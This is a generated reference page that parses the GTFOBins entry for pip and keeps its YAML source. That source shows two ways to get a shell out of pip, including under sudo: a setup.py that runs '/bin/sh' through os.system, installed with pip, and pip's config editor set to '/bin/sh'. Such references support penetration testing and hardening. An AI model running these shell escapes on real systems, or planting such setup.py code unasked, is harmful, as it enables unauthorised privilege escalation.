---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# pip

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `pip` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/pip` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [pip](../../tools/linux/pip.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | pip |
| name | pip |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/pip/ |

## Preserved Source Material

````yaml
_body: ''
_name: pip
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/pip
functions:
  inherit:
  - code: 'echo ''...'' >setup.py

      pip install --break-system-packages .'
    comment: 'This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed
      as argument (`.`).


      Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:


      ```

      echo ''import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")'' >setup.py

      ```


      The `--break-system-packages` flag can be omitted in older systems.'
    contexts:
      sudo: null
      unprivileged: null
    from: python
  shell:
  - code: pip config --editor '/bin/sh -s' edit
    contexts:
      sudo: null
      unprivileged: null
````
